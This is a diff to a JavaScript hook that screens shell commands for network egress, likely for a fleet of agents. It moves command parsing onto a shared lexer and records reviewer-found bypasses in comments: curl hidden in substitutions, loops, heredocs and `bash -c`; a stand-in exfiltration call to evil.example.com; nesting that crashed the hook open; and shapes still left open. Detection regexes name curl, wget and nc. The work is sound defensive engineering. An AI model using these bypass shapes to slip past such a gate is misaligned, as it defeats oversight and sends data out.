@@ -36,9 +36,13 @@
 // external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
 // a search domain to anywhere.
 //
-// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
-// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
-// is not a command; the URL from the ORIGINAL text of the same span.
+// HOW IT READS THE COMMAND (card fae0712e): the shell STRUCTURE comes from the shared lexer,
+// scripts/lib/shell-lex.mjs -- where a quote, a # comment, a heredoc body, a substitution and a command
+// boundary are. A `curl` or `;` inside a quoted argument, an escaped `\;`, a comment or a quoted heredoc
+// body is not a command; a $( ), backtick, ( ), <( ) or >( ) body is a command of its own, judged with
+// this command's assignments and loop values (also one in an unquoted heredoc body, where the shell runs
+// it). The gate's own rules (curl argv, URL hosts, interpreters, wrappers, pins) read the lexer's words
+// and segments. A URL in a comment is not in the command: it is no destination and no "external literal".
 //
 // WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
 // the name-and-shape list will never be complete. Still open after (a): network calls INSIDE a script
@@ -51,13 +55,19 @@
 // is read (`printf ... | tr ... | python3 -` passes) (Viktor 28582, LOW).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
-// Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
-// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
+// Fail-open on an internal error (logged): a crashed gate must not silence the fleet; that is today's
+// behaviour, not a new hole. Text the lexer does not fully understand (its `problems`: an unterminated
+// quote, heredoc or substitution, a heredoc inside a substitution) is still judged on what the lexer read,
+// and a deny found there stands; only when nothing denies is it an allow ("unparseable"), as before. No
+// rule LOOSENS because of a problem (the gh-pr.mjs pin refuses it). Every DENY is appended to the block log.
+// A command longer than MAX_COMMAND_CHARS (65 536) is not read in full: a cheap, strict reading of its raw text decides
+// (a network tool alone denies there; see cheapVerdict). This bounds the text the full reading sees; it does not prove
+// every shape under the cap fast (the measured ones are in the HIGH 6 test).
 import { readFileSync, appendFileSync, realpathSync, mkdirSync, lstatSync } from 'node:fs'
 import { createHash } from 'node:crypto'
 import { fileURLToPath } from 'node:url'
 import { dirname, join } from 'node:path'
-import { maskInertLiterals } from '../self-pace-gate.mjs'
+import { lex, words as lexWords } from '../lib/shell-lex.mjs'
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
 export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
@@ -139,6 +149,9 @@ const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
 // http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
 const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
 const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
+// the unparseable-external reserve (Klodel 42889): a network tool or an interpreter named anywhere in a raw text
+const NET_TOOL_RAW = /(?<![\w.-])(?:curl|wget|nc|ncat)(?![\w-])/
+const INTERPRETER_RAW = /(?<![\w.-])(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)(?![\w-])/
 const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
 // Words that can stand before the real command word of a sub-command. The shell keywords are here
 // because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
@@ -228,23 +241,19 @@ export function isExternal(url) {
   if (h === null || h === '') return false
   return !isLocalHost(h)
 }
-// A lone `&` (background) ends a command like `;` does: `true & curl <url>` runs curl as its own
-// command, and without the split the span's command word was `true` (decfb196). Not split: `&&`
-// (matched first), and the redirections `2>&1`, `>&2`, `<&3`, `&>file`, `&>>file`.
-function spans(masked) {
-  const out = []; let start = 0
-  const re = /&&|\|\||;|\||\n|(?<![<>&])&(?![>&])/g; let m
-  while ((m = re.exec(masked))) { out.push([start, m.index]); start = m.index + m[0].length }
-  out.push([start, masked.length])
-  return out
-}
-function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
-function collectAssignments(orig, masked) {
+// The simple commands come from the lexer's segments (card fae0712e): a `;` `&&` `||` `|` `|&`, a newline
+// and a lone `&` (background: `true & curl <url>` runs curl as its own command, decfb196) end a command;
+// `2>&1`, `>&2`, `<&3`, `&>file` do not; a quoted or escaped separator, a comment and a heredoc body are
+// no boundary and no command.
+// `NAME=value` words of this command (also after export / local / readonly, and anywhere in a command, as
+// the earlier regex read them). The NAME= part must be unquoted code: `echo "a U=x"` assigns nothing.
+function collectAssignments(r) {
   const env = {}
-  for (const [a, b] of spans(masked)) {
-    const seg = orig.slice(a, b)
-    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
-      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
+  for (const ws of r.segWords) {
+    for (const w of ws) {
+      const m = /^[A-Za-z_][A-Za-z0-9_]*=/.exec(w.text)
+      if (!m || !/^c+$/.test(r.lxB.cls.slice(w.start, w.start + m[0].length))) continue
+      env[m[0].slice(0, -1)] = w.text.slice(m[0].length)
     }
   }
   return env
@@ -252,15 +261,21 @@ function collectAssignments(orig, masked) {
 // `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
 // NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
 // unread destination and passed, while the same URL as a literal or a plain assignment was denied.
-// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
-// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
-function collectLoops(orig, masked, env) {
+// The keyword is an unquoted word (a quoted "for u in" is not a loop); the values are the words after
+// `in`, unquoted, with this command's assignments expanded in them (an unquoted value splits again).
+function collectLoops(r, env) {
   const loops = {}
-  for (const [a, b] of spans(masked)) {
-    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
-    if (!m) continue
-    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
-    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
+  for (const ws of r.segWords) {
+    const at = ws.findIndex((w, k) => w.text === 'for' && !w.quoted && /^[A-Za-z_][A-Za-z0-9_]*$/.test(ws[k + 1]?.text ?? '') &&
+      !ws[k + 1].quoted && ws[k + 2]?.text === 'in' && !ws[k + 2].quoted)
+    if (at === -1) continue
+    const vals = ws.slice(at + 3).flatMap((w) => {
+      const v = expand(w.text, env)
+      return w.quoted ? [v] : v.split(/\s+/).filter(Boolean)
+    })
+    // appended in place: copying the list per loop was quadratic when one name loops many times (fae0712e h8)
+    const list = (loops[ws[at + 1].text] ??= [])
+    for (const v of vals) list.push(v)
   }
   return loops
 }
@@ -276,138 +291,176 @@ function asWord(value) {
   if (/^[^\s'"`\\]+$/.test(value)) return value
   return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
 }
+// The definition order of a loops object (its key order), computed once per object.
+const LOOP_ORDER = new WeakMap()
+function loopOrder(loops) {
+  let order = LOOP_ORDER.get(loops)
+  if (!order) {
+    order = new Map(Object.keys(loops).map((v, k) => [v, k]))
+    LOOP_ORDER.set(loops, order)
+  }
+  return order
+}
+// Viktor 2026-11-15 (b58374d7, HIGH 6): this was quadratic in the command. A RegExp per loop variable of the whole
+// command, per segment (3 000 sequential `for vN in a; do x=$vN; done` took 10 s, past the hook's timeout, which
+// allows), and the size check came after the product was built (12 000 `for i in a; ...` loops: `i` holds 12 000
+// values, 12 s). Now only the loop variables the text names are looked at, in DEFINITION order as before: a value is
+// pasted raw when it is one word, so a value that spells another loop variable (`for a in '$b'`) is replaced again
+// when that variable comes later, and the order decides whether it does (test: "loop readings keep the definition order").
+// The size check runs before the product.
 function loopVariants(text, env, loops) {
+  const order = loopOrder(loops)
+  const named = new Set()
+  for (const m of text.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (order.has(m[1])) named.add(m[1])
   let out = [text]
-  for (const [v, vals] of Object.entries(loops)) {
+  for (const v of [...named].sort((a, b) => order.get(a) - order.get(b))) {
+    const vals = loops[v]
     const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
     if (!re.test(text)) continue
     re.lastIndex = 0
+    if (out.length * vals.length > MAX_LOOP_VARIANTS) return null
     out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
-    if (out.length > MAX_LOOP_VARIANTS) return null
   }
   return out.map((t) => expand(t, env))
 }
 function expand(text, env) {
   return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
 }
-// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
-// so offsets still align), classify each inner command separately, and parse the rest without them.
-// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
-// measured, 32% of fleet commands were unparseable and would have been allowed blind.
-// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
-// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
-// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
-// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
-function substEnd(text, i) { // text[i..] starts with $( (or <( / >() -> index just past the matching )
-  return parenEnd(text, i + 1)
+// $( ... ), backtick, ( ... ), <( ... ) and >( ... ) bodies are commands of their own: each is classified
+// separately (with this command's assignments and loop values), and the rest of the command is read with
+// the frame blanked out (length-preserving per code point, so the lexer's indices still align). The frames
+// come from the shared lexer (card fae0712e), so a substitution counts only where the shell runs it: at top
+// level, inside "...", inside an unquoted-tag heredoc body. Inside '...', $'...', a comment and a
+// quoted-tag heredoc body it is inert text (a HANDOFF.md written with `cat > f <<'EOF'` that mentions a curl
+// in backticks is no command). A plain ${ } and an arithmetic $(( )) / (( )) run no command of their own:
+// a command frame inside one is still found; an arithmetic frame is blanked like the earlier lifter did,
+// a ${ } stays in the text (expand() reads `${U}`). bash 5.3's `${ cmd; }` / `${| cmd; }` runs a command
+// and is a command frame (over-reading is the safe side).
+const CMD_FRAMES = new Set(['$(', '`', '(', '<(', '>('])
+function substParents(substs) { // the innermost enclosing subst of each (-1 = top); substs come in opening order
+  const par = new Array(substs.length).fill(-1); const open = []
+  substs.forEach((x, k) => {
+    while (open.length && substs[open[open.length - 1]].end <= x.start) open.pop()
+    par[k] = open.length ? open[open.length - 1] : -1
+    open.push(k)
+  })
+  return par
 }
-function parenEnd(text, open) { // text[open] is ( -> index just past the matching )
-  let depth = 1, j = open + 1, q = null
-  while (j < text.length && depth > 0) {
-    const c = text[j]
-    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
-    else if (c === "'" || c === '"') q = c
-    else if (c === '(') depth++
-    else if (c === ')') depth--
-    j++
+// The children of each subst under substParents() `par`, computed once per par array.
+const KIDS = new WeakMap()
+function childrenOf(par) {
+  let kids = KIDS.get(par)
+  if (!kids) {
+    kids = par.map(() => [])
+    par.forEach((p, j) => { if (p >= 0) kids[p].push(j) })
+    KIDS.set(par, kids)
   }
-  return j
+  return kids
 }
-function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
-  let j = i + 1
-  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
-  return Math.min(j + 1, text.length)
-}
-export function liftSubstitutions(text) {
-  const inners = []; let out = ''; let i = 0
-  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
-  const lift = (at) => {
-    if (text[at] === '$' && text[at + 1] === '(') {
-      const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
-    }
-    if (text[at] === '`') {
-      const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
-    }
-    return -1
-  }
-  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
-  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
-  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
-  // (a `gh pr comment --body "... \`code\` ..."`).
-  const copyLive = (from, to) => {
-    let k = from
-    while (k < to) {
-      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
-      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
-      const n = lift(k)
-      if (n !== -1) { k = n; continue }
-      out += text[k]; k++
-    }
-  }
-  while (i < text.length) {
-    const c = text[i]
-    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
-    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
-    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
-    // and the word after it is parsed as ordinary (quoted or live) text.
-    if (text.startsWith('<<<', i)) { out += '   '; i += 3; continue }
-    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
-    if (here) {
-      const tag = here[1] ?? here[2] ?? here[3]
-      const quotedTag = here[1] != null || here[2] != null
-      out += here[0]; i += here[0].length
-      const nl = text.indexOf('\n', i)
-      if (nl === -1) { copyLive(i, text.length); break }
-      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
-      // by processing it recursively, then continue with the body
-      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
-      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
-      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
-      const rel = endRx.exec(text.slice(i))
-      const bodyEnd = rel ? i + rel.index : text.length
-      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
-      i = bodyEnd
+// Adds the frames of subst k of lexer result t (over code points cp) to out, shifted by `shift`. A walk with its own
+// stack, in the same pre-order as a recursion: Viktor 42933 HIGH 5, `$(( ` nested 2000 deep (and ${x:- 6000 deep)
+// overflowed the call stack in the recursive walk, the hook's catch allowed, and bash ran the curl after it. The
+// children come from an index, not a scan of every subst per frame (that was quadratic in the nesting).
+function visitFrame(t, cp, par, k0, out, shift) {
+  const kids = childrenOf(par)
+  const todo = [k0]
+  while (todo.length) {
+    const k = todo.pop()
+    const x = t.substs[k]
+    const runs = CMD_FRAMES.has(x.kind) || (x.kind === '${' && /^[\s|]$/.test(cp[x.inner[0]] ?? ''))
+    if (runs) {
+      out.push({ start: shift + x.start, end: shift + x.end, inner: cp.slice(x.inner[0], x.inner[1]).join('') })
       continue
     }
-    if (c === "'") {
-      const end = text.indexOf("'", i + 1)
-      const stop = end === -1 ? text.length : end + 1
-      out += text.slice(i, stop); i = stop; continue
-    }
-    if (c === '$' && text[i + 1] === "'") {
-      let j = i + 2
-      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
-      const stop = Math.min(j + 1, text.length)
-      out += text.slice(i, stop); i = stop; continue
-    }
-    if (c === '"') {
-      let j = i + 1
-      while (j < text.length && text[j] !== '"') {
-        if (text[j] === '\\') { j += 2; continue }
-        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
-        if (text[j] === '`') { j = backtickEnd(text, j); continue }
-        j++
-      }
-      out += '"'
-      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
-      copyLive(i + 1, j); out += '"'; i = j + 1; continue
-    }
-    // A ( ... ) subshell and a <( ... ) / >( ... ) process substitution run a command of their own
-    // too (Viktor, decfb196 review): `(curl -s http://x)` and `cat <(curl -s http://x)` passed,
-    // because the command word was read as "(curl" or never reached. Lifted like $( ... ), with the
-    // same scope. Only here, at top level: inside "..." and in a heredoc body ( is literal text.
-    if (c === '(' || ((c === '<' || c === '>') && text[i + 1] === '(')) {
-      const open = c === '(' ? i : i + 1
-      const j = parenEnd(text, open)
-      inners.push(text.slice(open + 1, Math.max(open + 1, j - 1))); out += ' '.repeat(j - i); i = j; continue
-    }
-    const n = lift(i)
-    if (n !== -1) { i = n; continue }
-    out += c; i++
+    if (x.kind !== '${') out.push({ start: shift + x.start, end: shift + x.end, inner: null }) // arithmetic: blanked
+    for (let m = kids[k].length - 1; m >= 0; m--) todo.push(kids[k][m])
   }
-  return { stripped: out, inners }
+}
+// The live substitutions of an unquoted-tag heredoc body (the lexer gives the body as one class 'u' run):
+// a backslash escapes, and each $( ${ $(( or backtick opener is measured by lexing the text from there.
+function bodyFrames(cp, h, out) {
+  let k = h.bodyStart
+  while (k < h.bodyEnd) {
+    const ch = cp[k]
+    if (ch === '\\') { k += 2; continue }
+    if (ch === '`' || (ch === '$' && (cp[k + 1] === '(' || cp[k + 1] === '{'))) {
+      // Lexed from the opener over a growing window (to the end of its line, then doubled): where a
+      // substitution closes depends only on the text before the closer, so the first window it closes in
+      // gives the same answer as the whole body, without lexing the rest of the body once per opener.
+      let len = 0
+      while (k + len < h.bodyEnd && cp[k + len] !== '\n') len++
+      let tail; let t
+      for (len = Math.max(len + 1, 64); ; len *= 2) {
+        tail = cp.slice(k, Math.min(k + len, h.bodyEnd))
+        t = lex(tail.join(''))
+        if (t.substs[0].inner[1] < t.substs[0].end || k + len >= h.bodyEnd) break
+      }
+      const from = out.length
+      visitFrame(t, tail, substParents(t.substs), 0, out, k)
+      // blanked without its newlines: an unterminated opener runs to the body's end, and the terminator
+      // line must stay a line of its own
+      for (const f of out.slice(from)) f.body = true
+      k += Math.max(1, t.substs[0].end)
+      continue
+    }
+    k++
+  }
+}
+// Everything classify() reads about one command text. Code-point arrays throughout, as the lexer counts.
+//   norm:  the text with every backslash-newline the shell removes taken out (not one inside '...' or a
+//          comment, unlike the earlier regex), so `cu\<nl>rl` is `curl`;
+//   frames: the command frames to classify on their own ({start, end, inner}; inner null = arithmetic);
+//   blank / blankCp / lxB: the text with the frames blanked, and its lexer result;
+//   segs, segWords: the top-level simple commands of `blank` and their words;
+//   codeText: norm without comments (for the "external URL literal anywhere" reserves).
+function readCommand(command) {
+  let lx = lex(command)
+  let norm = command
+  if (lx.cls.includes('l')) {
+    const raw = Array.from(command)
+    norm = raw.filter((_, k) => lx.cls[k] !== 'l').join('')
+    lx = lex(norm)
+  }
+  const cp = Array.from(norm)
+  const par = substParents(lx.substs)
+  const frames = []
+  lx.substs.forEach((_, k) => { if (par[k] === -1) visitFrame(lx, cp, par, k, frames, 0) })
+  for (const h of lx.heredocs) if (!h.quoted) bodyFrames(cp, h, frames)
+  frames.sort((a, b) => a.start - b.start)
+  // A position is blanked when a frame covers it, except a newline that only heredoc-body frames cover. Counted with
+  // difference arrays: blanking each frame's span in turn was quadratic in the nesting (Viktor 42933 HIGH 5 shapes:
+  // 40 000 nested frames took 4-6 s, towards the hook's timeout, which allows).
+  const blankCp = cp.slice()
+  const anyD = new Int32Array(cp.length + 1), codeD = new Int32Array(cp.length + 1)
+  for (const f of frames) {
+    const a = Math.max(0, f.start), b = Math.min(f.end, cp.length)
+    if (a >= b) continue
+    anyD[a]++; anyD[b]--
+    if (!f.body) { codeD[a]++; codeD[b]-- }
+  }
+  for (let k = 0, any = 0, code = 0; k < cp.length; k++) {
+    any += anyD[k]; code += codeD[k]
+    if (code > 0 || (any > 0 && cp[k] !== '\n')) blankCp[k] = ' '
+  }
+  // Viktor 42852 HIGH 3: a '#' right after a closed frame is word text in bash (echo $(true)#; b runs b). The blanked
+  // frame leaves a space before it, and the second lex would read a comment there; the original lex decides.
+  for (const f of frames) if (f.end < cp.length && cp[f.end] === '#' && lx.cls[f.end] === 'c') blankCp[f.end] = '_'
+  const blank = blankCp.join('')
+  const lxB = lex(blank)
+  const segs = lxB.segments.filter((s) => s.frame === 'top')
+  return {
+    norm, cp, lx, frames, blank, blankCp, lxB, segs,
+    segWords: segs.map((s) => lexWords(blank, lxB, s)),
+    problems: [...new Set([...lx.problems, ...lxB.problems])],
+    codeText: cp.filter((_, k) => lx.cls[k] !== 'm').join(''),
+  }
+}
+// Kept for its tests: the command with its command frames blanked (UTF-16 length-preserving) and the frame
+// bodies, in order. classify() uses readCommand() directly.
+export function liftSubstitutions(text) {
+  const r = readCommand(String(text ?? ''))
+  const stripped = r.cp.map((ch, k) => (r.blankCp[k] === ch ? ch : ' '.repeat(ch.length))).join('')
+  return { stripped, inners: r.frames.filter((f) => f.inner !== null).map((f) => f.inner) }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -440,25 +493,13 @@ const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 
 const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
 const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i
 
-// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
+// The words of a shell text (one simple command, or an expanded copy of one), quotes removed, from the
+// shared lexer (card fae0712e): backslash pairs reduced the shell's way, $'...' decoded, a substitution
+// verbatim inside its word. A newline or separator in the text only ends a word.
 export function shellWords(text) {
-  const out = []; let cur = null; let i = 0
-  const push = () => { if (cur !== null) out.push(cur); cur = null }
-  while (i < text.length) {
-    const c = text[i]
-    if (/\s/.test(c)) { push(); i++; continue }
-    cur ??= ''
-    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
-    if (c === '"') {
-      let j = i + 1
-      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
-      i = j + 1; continue
-    }
-    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
-    cur += c; i++
-  }
-  push()
-  return out
+  const t = String(text ?? '')
+  const lx = lex(t)
+  return lx.segments.filter((s) => s.frame === 'top').flatMap((s) => lexWords(t, lx, s).map((w) => w.text))
 }
 // The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
 // (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
@@ -557,11 +598,12 @@ function hasExternalLiteral(text, vendorHosts, vendorDomains) {
 }
 // `scope` carries the enclosing command's assignments and loop values into a substitution, and
 // whether the WHOLE command (outermost text) carries an external URL literal.
-// Index of the real command word of a span's (masked) words. Besides assignments and PREFIX_WORDS it
+// Index of the real command word of a span's words (the lexer's, quotes removed, command frames blanked).
+// Besides assignments and PREFIX_WORDS it
 // steps over the words that open a body without being a command (decfb196, Viktor 2597/2634):
 //   - a case header up to its `in` (`case $x in a) curl ...`), and a case pattern: a leading word
-//     ending in `)` (`a)`, `a|b)`, `*)`; `(a)` is lifted as a subshell before this and leaves blanks);
-//   - a function head: `function NAME [{]`, or `NAME {` (`NAME()` leaves `NAME {` after lifting);
+//     ending in `)` (`a)`, `a|b)`, `*)`; `(a)` is a subshell frame, blanked before this);
+//   - a function head: `function NAME [{]`, or `NAME {` (`NAME()` leaves `NAME {` after blanking);
 //   - a leading `in`: a case header broken before it (`case $x` NEWLINE `in a) curl ...`) leaves a
 //     span that starts with `in` (Viktor L1, decfb196).
 // Fail-closed direction: a word wrongly stepped over only lets a LATER word be judged as curl.
@@ -584,8 +626,8 @@ function commandWordAt(mw) {
 
 // ---- stdin-fed interpreters and shells (Viktor 3d3307dd, reproduced 2026-11-05) ----------------
 // `python3 - <<'PY'`, `node - <<'JS'`, `bash <<EOF`, `sh -s <<EOF`, a here-string (`python3 - <<< '...'`)
-// and a pipe (`cat <<'EOF' | python3`) all hand the interpreter its PROGRAM on stdin. maskInertLiterals
-// blanks heredoc bodies (correctly: for every other command they are data), so before this the program
+// and a pipe (`cat <<'EOF' | python3`) all hand the interpreter its PROGRAM on stdin. A heredoc body is
+// no command (correctly: for every other command it is data), so before this the program
 // was never read and these shapes passed (Kernel 27756, Szigma 28413).
 const SHELLS = /^(?:bash|sh|zsh|dash|ksh)$/
 // Options whose VALUE is the next word (python -W/-X, node -r/--require/--import/--loader, shell -o).
@@ -594,7 +636,13 @@ const VALUE_OPTS = new Set(['-W', '-X', '-r', '--require', '--import', '--loader
 function stdinFed(mw, i) {
   const cmd = mw[i].split('/').pop()
   if (!(INTERPRETER.test(cmd) || SHELLS.test(cmd))) return false
-  const args = mw.slice(i + 1).filter((w) => !/^(?:\d*[<>]|&>)/.test(w)) // redirections are not program arguments
+  // Redirections are not program arguments. The words now include quoted ones (card fae0712e), so a bare
+  // operator word takes its target with it: `python3 <<< "$code"` and `python3 << 'PY'` are stdin-fed.
+  const args = []
+  for (let j = i + 1; j < mw.length; j++) {
+    if (/^\d*(?:<<<|<<-?|<>|>>?|<|>\||&>>?|[<>]&)$/.test(mw[j])) { j++; continue }
+    if (!/^(?:\d*[<>]|&>)/.test(mw[j])) args.push(mw[j])
+  }
   // A code flag means the program is in the argv, not on stdin. For a shell only `-c` is one: its `-e`,
   // `-E`, `-p` are errexit / errtrace / privileged (`bash -e <<EOF`, Viktor 28589). `-r` is code only
   // for php; for node, ruby, bun and deno it preloads a module (Viktor 28585 (2)).
@@ -629,8 +677,8 @@ function stdinFed(mw, i) {
 }
 // ---- a shell's -c <string> (Viktor 28589, card 55b51e54) -----------------------------------------
 // `bash -c 'curl https://x'` and `sh -c "curl ..."` passed: a shell is not an INTERPRETER, and the
-// string after -c is one quoted word, so maskInertLiterals blanked it and nothing read the command it
-// runs. The string is a command line of its own: it is classified like a $( ... ) substitution, with
+// string after -c is one quoted word, so nothing read the command it runs. The string is a command line
+// of its own: it is classified like a $( ... ) substitution, with
 // the same rules (curl destination from the argv, a one-liner only with a network primitive), the
 // enclosing assignments and loop values, and the same depth limit. Judging it by "any URL in the
 // string" would have repeated the stdin-shell false denies (a localhost call whose JSON carries a
@@ -638,110 +686,150 @@ function stdinFed(mw, i) {
 // usual carriers put it later: `timeout 10 sh -c`, `xargs -I{} sh -c`, `find . -exec sh -c`.
 // Options end at the first word that is not one: `bash x.sh -c y` runs x.sh, and its -c is the
 // script's argument. A -c anywhere in a short-option cluster counts (`bash -lc`, `sh -ec`).
-// The shell word and its options are read from the MASKED span (so a heredoc body or a quoted text
-// that merely mentions `bash -c '...'` is not a command); the string itself is quoted, hence blank in
-// the masked text, and is read as the first shell word of the ORIGINAL text after the last option.
+// It reads the lexer's words of the span (card fae0712e), quotes removed: a heredoc body or a comment
+// that merely mentions `bash -c '...'` is no word of the span, a quoted text that does is ONE word (not a
+// shell), and the string is the word after the last option ($'...' decoded).
 const SHELL_LONG_WITH_VALUE = new Set(['--rcfile', '--init-file'])
-export function shellCStrings(orig, masked, a, b) {
-  const toks = [...masked.slice(a, b).matchAll(/\S+/g)].map((m) => ({ w: m[0], end: a + m.index + m[0].length }))
+export function shellCStrings(ws) {
   const out = []
-  for (let k = 0; k < toks.length; k++) {
-    // `env -S <line>` / `--split-string[=]<line>` runs <line> as a command line (card 74d46cd0). The quoted
-    // value is blanked in `masked`, so the token ends where the value starts in `orig`.
-    if (toks[k].w.split('/').pop() === 'env') {
-      for (let j = k + 1; j < toks.length && toks[j].w.startsWith('-'); j++) {
-        const w = toks[j].w
+  for (let k = 0; k < ws.length; k++) {
+    // `env -S <line>` / `--split-string[=]<line>` runs <line> as a command line (card 74d46cd0).
+    if (ws[k].split('/').pop() === 'env') {
+      for (let j = k + 1; j < ws.length && ws[j].startsWith('-'); j++) {
+        const w = ws[j]
         if (w === '-S' || w === '--split-string' || w === '--split-string=') {
-          const str = shellWords(orig.slice(toks[j].end, b))[0]
-          if (str) out.push(str)
+          if (ws[j + 1]) out.push(ws[j + 1])
+          j++
         } else if (w.startsWith('--split-string=')) out.push(w.slice('--split-string='.length))
         else if (/^-[A-Za-z]*S[A-Za-z]*$/.test(w)) {
           // A short cluster with S (`-iS '<line>'`, `-vScurl`, Viktor 30051): the line is the rest of the cluster after
-          // the S, or the next word when the S is its last letter (the quoted value is blank in `masked`).
+          // the S, or the next word when the S is its last letter.
           const rest = w.slice(w.indexOf('S') + 1)
-          const str = rest || shellWords(orig.slice(toks[j].end, b))[0]
-          if (str) out.push(str)
+          if (rest) out.push(rest)
+          else { if (ws[j + 1]) out.push(ws[j + 1]); j++ }
         } else if (w.startsWith('-S') && w.length > 2) out.push(w.slice(2))
         else if (WRAPPERS.get('env').has(w)) j++
       }
       continue
     }
-    if (!SHELLS.test(toks[k].w.split('/').pop())) continue
-    let hasC = false; let last = toks[k].end
-    for (let j = k + 1; j < toks.length; j++) {
-      const w = toks[j].w
-      if (w === '--') { last = toks[j].end; break }
-      if (SHELL_LONG_WITH_VALUE.has(w)) { j++; last = toks[Math.min(j, toks.length - 1)].end; continue }
-      if (w.startsWith('--')) { last = toks[j].end; continue }
+    if (!SHELLS.test(ws[k].split('/').pop())) continue
+    let hasC = false; let j = k + 1
+    for (; j < ws.length; j++) {
+      const w = ws[j]
+      if (w === '--') { j++; break }
+      if (SHELL_LONG_WITH_VALUE.has(w)) { j++; continue }
+      if (w.startsWith('--')) continue
       if (!/^[-+][A-Za-z]+$/.test(w)) break
       if (w[0] === '-' && w.includes('c')) hasC = true
